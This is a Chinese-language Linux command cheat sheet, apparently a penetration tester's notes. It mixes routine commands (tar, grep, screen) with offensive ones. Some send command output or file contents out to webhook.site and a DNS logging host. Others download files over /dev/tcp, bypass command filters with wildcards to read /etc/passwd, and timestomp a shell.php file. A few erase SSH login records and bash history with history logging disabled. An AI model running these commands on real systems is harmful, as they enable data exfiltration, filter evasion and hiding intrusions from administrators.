linux命令

find查找一个文件，并在查找文件所在目录下写入新文件

find / -name 111.png | while read f;do echo 123 | tee $(dirname $f)/123.php;done

curl命令执行外带

//get
curl https://webhook.site/b6deb5d8-e615-4280-9625-fe76f66f4531/`ps -ef|base64 -w 0`

//post
curl -d `ps -ef|base64 -w 0` https://webhook.site/b6deb5d8-e615-4280-9625-fe76f66f4531

//post, @后面跟 - , 代表输入输出
cat r.txt | curl -F data=@-  https://webhook.site/b6deb5d8-e615-4280-9625-fe76f66f4531

bash下载文件

exec 3<>/dev/tcp/192.168.8.128/9090;echo -e "GET /index.html HTTP/1.0\r\n" >&3;((while read line; do [[ "$line" == $'\r' ]] && break; done && cat) <&3) > test.sh

查找包含指定内容的文件

grep -ir password /home/test/Desktop/Temp/

搜索包含二进制数据的文件

// -a 将文件视为文本文件
grep -a "hello" /var/log/binary_file

tar预览压缩包

tar -tf www.tar.gz

tar排除指定后缀文件打包

tar -zcf ttt.tar.gz --exclude='*.txt' --exclude='*.png' ttt

根据进程名停止进程

kill -9 $(pidof 'ping')

更改文件时间

//将shell.php的时间修改为index.html的时间
touch -r index.html shell.php

base64编码不换行

echo 123 | base64 -w 0

16进制编码文件

xxd -c 9999 -p boot12.bin

删除ssh登录的last记录

//有些系统可能开头空格没起作用，会记录当前命令，记得history查看下
 set +o history;utmpdump /var/log/wtmp > /tmp/wtmp.file;sed -i '$d' /tmp/wtmp.file;utmpdump  -r < /tmp/wtmp.file > /var/log/wtmp;rm /tmp/wtmp.file

删除ssh登录的lastlog记录

 set +o history;utmpdump /var/log/lastlog > /tmp/lastlog.file;sed -i '$d' /tmp/lastlog.file;utmpdump  -r < /tmp/lastlog.file > /var/log/lastlog;rm /tmp/lastlog.file

sed删除指定字符串所在行

//删除log.txt中123qwe所在行
sed -i '/123qwe/d' log.txt

sed删除100行以后的命令

sed -i '100,$d' /root/.bash_history

nc文件传输

# 收
nc -nvlp 4444 > aaa

# 发
nc -nv 192.168.30.35 4444 </usr/share/aaa

延时判断命令是否成功

//提取whoami的第一个字符判断是否为t
time if [ $(whoami|cut -c 1) == t ]; then sleep 5; fi

host命令dns外带

for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done

通配符绕过命令执行

# ls --help
/???/?s --help

# /bin/cat /etc/passwd
/???/??t /???/??ss??

screen查看会话

screen -ls

screen创建会话

screen -S 会话id(会话名)

screen进入会话

screen -R 会话id(会话名)

screen从会话返回

ctrl a+d
